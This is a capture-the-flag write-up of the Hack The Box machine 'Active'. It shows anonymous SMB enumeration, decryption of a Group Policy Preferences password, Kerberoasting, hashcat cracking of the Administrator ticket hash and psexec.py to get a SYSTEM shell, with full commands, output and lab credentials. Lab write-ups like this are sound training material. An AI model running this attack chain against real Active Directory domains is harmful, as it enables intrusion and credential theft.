---
layout: post
title: "[HTB] Active Writeup"
slug: "active"
date: "2024-04-09"
comments: false
categories:
  - hacking
tags:
  - write up
  - hack the box
  - active directory
---

### Enumeration 
**IP**: 10.10.10.100

```bash
> nmap -sCV -v 10.10.10.100
PORT      STATE SERVICE       VERSION                                           
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 
2008 R2 SP1)                                                                    
| dns-nsid:                                                                     
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)                             
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-0
9 07:25:08Z)                                                                    
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results: 
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-09T07:26:11
|_  start_date: 2024-04-09T07:21:15
```

###### SMBClient
```bash
> smbclient -L 10.10.10.100
Password for [WORKGROUP\ngaihte]:
Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```
###### Using netexec to enumerate smb

![](/images/active/read_access.png)
We have anonymous read access on `Replication`. Enumerate further using spider.
```bash
> netexec smb 10.10.10.100 -u '' -p '' -M spider_plus --share Replication
SPIDER_PLUS 10.10.10.100    445    DC               [+] Saved share-file metadata to "/tmp/nxc_spider_plus
```

Here is our enumerated files.
```json
{
"Replication": {
	"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "23 B"
	},
	"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "119 B"
	},
	"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "1.07 KB"
	},
	"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "533 B"
	},
	"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "2.72 KB"
	},
	"active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "22 B"
	},
	"active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
	"atime_epoch": "2018-07-21 16:07:44",
	"ctime_epoch": "2018-07-21 16:07:44",
	"mtime_epoch": "2018-07-21 16:08:11",
	"size": "3.63 KB"
	}
}
}
```

Download the files and analyse them. 
```bash
> smbclient //10.10.10.100/Replication
smb: \> get active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml 
```
**Groups.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

We have user `SVC_TGS` and encrypted password in Group Policy.

Let's decrypt the encrypted password using a tool. [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)
```bash
python3 ~/htb/gpp-decrypt/gpp-decrypt.py -f Groups.xml
[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```

Let's try our obtained credentials on the host.
![](/images/active/authen_read_access.png)

Connect to the `Users` share.
```bash
> smbclient //10.10.10.100/Users -U SVC_TGS --password GPPstillStandingStrong2k18 
smb: \> get \SVC_TGS\Desktop\user.txt
 ```

Enumerating users using netexec.
![](/images/active/netexec_users.png)
Since we now have credentials, we can try Kerberoasting attack  on the host.

Using `Impacket tools` let's try to perform kerberoasting. GetUserSPNs.py will help us achieve that.
![](/images/active/administrator_hash.png)
Lets crack the hash using hashcat.
```bash
> hashcat -m 13100 admin_hash.txt ~/SecLists/Passwords/Leaked-Databases/rockyou.txt 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7bdf71bf1d7ca654587c3456ad00decd$14a0add7d36fa9aa563676ded727df60cfc47ee1efbf221b42f27ba4c892d4aec89fa5ad43b4f04aafdc34f798ac9e413d5d66afdd86345a69d9dbc299b69d0bb4d73a99c0d13c54d1e8befed66d05089f8263faf75eb6defb8da8f13b364d63b12cc76d928368716a5fcf542f0959883264a9f0b55fd8e5f70f3554295ceaa0cf42f5d495a02e53eb158a65e00a24c50ee6a361c045ad72bd66fe47b638b3b52c922ad33909e8ace5f11d2ab3c1e17f3998ed92be552cd336891b326eb59d477de04174737c50c84550f22e4f573c8cc2d7e257d85f0204efe4e08649a26474549484767da8f3b0d241c779a291ba8a902835f63c375acaecacaf00d199e2b3f3824c3b46c6dfadbff3ef2094cc0e43e882cc0e8abd366cea44566bc0fe6b4e0473511ee08ddf068575453fdcb1533da3c10aa7dcb0ad0bf7f6e7b304477f06157c27cd8ac94f14183ad84612cd2f5426fa2f05163b6a8a31ee424f1c34fbde78bac0fed26575308b76a1a3ac1e6cd117e89239a6bfb341eb849d6bc57aaae3e8464c9a470130aefb0b54c3b2eb51ce26657bfe20f61bbe700a35057f78d3e65ff440fccf2a0c1e91bead18971b53a37a7e7bc32afdcbbef373764dc82b13ac0f2caab7925716ee99b501075937d24e5c87f0f41095edaf18ff6d544913045857aa720d505991586517b762264a5159d03d60a9cbe8d5825cceed6bdbc61c0d4b8a4a4f3c4639720acb67c2d915c307665d8ac53c36079b749c832bb73d90fcf3e07d062b8980fcdc3965ec84e42c7a87d3bc0494b14543b54e59b44ff5fb5145f529345ad620b04c3204994d0ef50062f1ccf6678090eb0af1d6f282cabc9d3e246aa480e914937f09815f7ae2b2f9bf685355b0901c6aba36a9faa199621a20a3c7d18277bbb2cb332c7441d7015454881810c053af4ed7b11065b86866c622037282f9cd33a72af7d448f1c1888db4f4f9c0ad2b287dc0a6aad1a3aa473bbfaa3a7a17761e14fdbe22b3bda03dcd6d9175cb3246e48383fc8b749379eb4b09fcc2469fdba1cf9b16bbd086ebd8e6fe0e201ef2efaa7eac9ede81628d52c2a7f21f5ed87abb94b4175ae01b082198a41ee9280fab98327e67789bdd5141b26b5b8267c8c0e26e65043c1ba599a5c1d95f37df0ca4440d56111e762ac436d3ef56c6625974728e43eb94c4388110f7c247a203ae04d9f554205a496b87b14b4afbe319a2e0e891791a36e3fbe81c512d673fcdd4089aba69b4:Ticketmaster1968
```

We now have administrator password.
```bash
> netexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

We have confirmed that we have access on the host.

Using `Impacket psexec.py` lets obtain a shell on the host.
```bash
psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file VQkiBXIE.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service TUWJ on 10.10.10.100.....
[*] Starting service TUWJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

 ![](/images/active/pwned.png)